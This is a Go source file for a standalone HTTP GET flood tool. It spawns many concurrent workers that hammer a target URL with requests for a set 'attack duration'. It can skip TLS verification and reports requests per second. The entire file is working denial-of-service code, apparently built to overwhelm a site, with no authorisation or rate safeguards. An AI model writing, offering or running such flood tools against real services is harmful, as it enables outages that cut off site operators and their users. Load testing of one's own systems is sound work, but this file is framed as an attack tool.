package main

import (
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"runtime"
	"sync"
	"sync/atomic"
	"time"
)

type FloodConfig struct {
	URL         string
	Workers     int
	Duration    time.Duration
	Timeout     time.Duration
	UserAgent   string
	Headers     map[string]string
	MaxConns    int
	KeepAlive   bool
	DisableTLS  bool
}

type Stats struct {
	TotalRequests   int64
	SuccessRequests int64
	FailedRequests  int64
	StartTime       time.Time
}

func (s *Stats) IncrementTotal() {
	atomic.AddInt64(&s.TotalRequests, 1)
}

func (s *Stats) IncrementSuccess() {
	atomic.AddInt64(&s.SuccessRequests, 1)
}

func (s *Stats) IncrementFailed() {
	atomic.AddInt64(&s.FailedRequests, 1)
}

func (s *Stats) GetStats() (int64, int64, int64) {
	return atomic.LoadInt64(&s.TotalRequests),
		atomic.LoadInt64(&s.SuccessRequests),
		atomic.LoadInt64(&s.FailedRequests)
}

func createUltraFastClient(config *FloodConfig) *http.Client {
	// Ultra-optimized transport for maximum speed
	transport := &http.Transport{
		DialContext: (&net.Dialer{
			Timeout:   1 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: config.DisableTLS,
			MinVersion:         tls.VersionTLS12,
		},
		MaxIdleConns:        config.MaxConns,
		MaxIdleConnsPerHost: config.MaxConns,
		MaxConnsPerHost:     config.MaxConns,
		IdleConnTimeout:     90 * time.Second,
		TLSHandshakeTimeout: 2 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		DisableKeepAlives:   !config.KeepAlive,
		DisableCompression:  true, // Disable compression for speed
		ForceAttemptHTTP2:   true,
	}

	return &http.Client{
		Transport: transport,
		Timeout:   config.Timeout,
	}
}

func worker(ctx context.Context, client *http.Client, config *FloodConfig, stats *Stats, wg *sync.WaitGroup) {
	defer wg.Done()

	for {
		select {
		case <-ctx.Done():
			return
		default:
			stats.IncrementTotal()
			
			req, err := http.NewRequestWithContext(ctx, "GET", config.URL, nil)
			if err != nil {
				stats.IncrementFailed()
				continue
			}

			// Set headers for maximum compatibility and speed
			req.Header.Set("User-Agent", config.UserAgent)
			req.Header.Set("Accept", "*/*")
			req.Header.Set("Accept-Encoding", "identity") // No compression for speed
			req.Header.Set("Connection", "keep-alive")
			req.Header.Set("Cache-Control", "no-cache")

			// Add custom headers
			for key, value := range config.Headers {
				req.Header.Set(key, value)
			}

			resp, err := client.Do(req)
			if err != nil {
				stats.IncrementFailed()
				continue
			}

			// Drain and close response body immediately for connection reuse
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()

			if resp.StatusCode >= 200 && resp.StatusCode < 400 {
				stats.IncrementSuccess()
			} else {
				stats.IncrementFailed()
			}
		}
	}
}

func printStats(stats *Stats, duration time.Duration) {
	total, success, failed := stats.GetStats()
	elapsed := time.Since(stats.StartTime)
	rps := float64(total) / elapsed.Seconds()
	successRate := float64(success) / float64(total) * 100

	fmt.Printf("\n=== ULTRA FAST FLOOD RESULTS ===\n")
	fmt.Printf("Duration: %v\n", elapsed)
	fmt.Printf("Total Requests: %d\n", total)
	fmt.Printf("Successful: %d (%.2f%%)\n", success, successRate)
	fmt.Printf("Failed: %d\n", failed)
	fmt.Printf("Requests/sec: %.2f\n", rps)
	fmt.Printf("================================\n")
}

func main() {
	// Command line flags
	url := flag.String("url", "", "Target URL (required)")
	workers := flag.Int("workers", runtime.NumCPU()*4, "Number of concurrent workers")
	duration := flag.Duration("duration", 10*time.Second, "Attack duration")
	timeout := flag.Duration("timeout", 5*time.Second, "Request timeout")
	userAgent := flag.String("user-agent", "UltraFlood/1.0 (High-Performance HTTP Client)", "User-Agent header")
	maxConns := flag.Int("max-conns", 1000, "Maximum connections per host")
	keepAlive := flag.Bool("keep-alive", true, "Enable HTTP keep-alive")
	disableTLS := flag.Bool("disable-tls", false, "Disable TLS verification")
	quiet := flag.Bool("quiet", false, "Quiet mode (no real-time stats)")

	flag.Parse()

	if *url == "" {
		fmt.Println("Error: URL is required")
		fmt.Println("Usage: go run main.go -url=https://example.com [options]")
		flag.PrintDefaults()
		return
	}

	// Optimize Go runtime for maximum performance
	runtime.GOMAXPROCS(runtime.NumCPU())

	config := &FloodConfig{
		URL:         *url,
		Workers:     *workers,
		Duration:    *duration,
		Timeout:     *timeout,
		UserAgent:   *userAgent,
		Headers:     make(map[string]string),
		MaxConns:    *maxConns,
		KeepAlive:   *keepAlive,
		DisableTLS:  *disableTLS,
	}

	stats := &Stats{
		StartTime: time.Now(),
	}

	fmt.Printf("� ULTRA FAST HTTP GET FLOOD INITIATED\n")
	fmt.Printf("Target: %s\n", config.URL)
	fmt.Printf("Workers: %d\n", config.Workers)
	fmt.Printf("Duration: %v\n", config.Duration)
	fmt.Printf("Max Connections: %d\n", config.MaxConns)
	fmt.Printf("Keep-Alive: %v\n", config.KeepAlive)
	fmt.Printf("TLS Verification: %v\n", !config.DisableTLS)
	fmt.Printf("================================\n")

	// Create ultra-fast HTTP client
	client := createUltraFastClient(config)

	// Create context with timeout
	ctx, cancel := context.WithTimeout(context.Background(), config.Duration)
	defer cancel()

	// Start workers
	var wg sync.WaitGroup
	for i := 0; i < config.Workers; i++ {
		wg.Add(1)
		go worker(ctx, client, config, stats, &wg)
	}

	// Real-time stats display
	if !*quiet {
		go func() {
			ticker := time.NewTicker(1 * time.Second)
			defer ticker.Stop()
			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					total, success, failed := stats.GetStats()
					elapsed := time.Since(stats.StartTime)
					rps := float64(total) / elapsed.Seconds()
					fmt.Printf("\rRequests: %d | Success: %d | Failed: %d | RPS: %.0f", total, success, failed, rps)
				}
			}
		}()
	}

	// Wait for all workers to complete
	wg.Wait()

	// Print final statistics
	printStats(stats, config.Duration)

	log.Println("Ultra fast flood completed successfully!")
}
